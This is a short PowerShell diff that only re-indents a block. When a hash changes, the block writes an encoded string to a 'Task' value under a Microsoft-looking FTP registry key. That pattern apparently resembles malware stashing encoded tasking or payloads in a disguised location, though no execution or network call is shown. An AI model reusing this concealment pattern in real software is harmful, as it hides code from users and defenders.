@@ -23,10 +23,10 @@ if ($hash -eq $old_hash) {
     
     } else {
     
-        try {
-            Get-ItemProperty "REGISTRY::\HKEY_CURRENT_USER\Software\Microsoft\FTP" | Select-Object -ExpandProperty Task -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -Value $EncodedText
-        } catch {
-            New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -PropertyType String -Value $EncodedText
-        }
+    try {
+        Get-ItemProperty "REGISTRY::\HKEY_CURRENT_USER\Software\Microsoft\FTP" | Select-Object -ExpandProperty Task -ErrorAction Stop | Out-Null
+        Set-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -Value $EncodedText
+    } catch {
+        New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -PropertyType String -Value $EncodedText
     }
+}
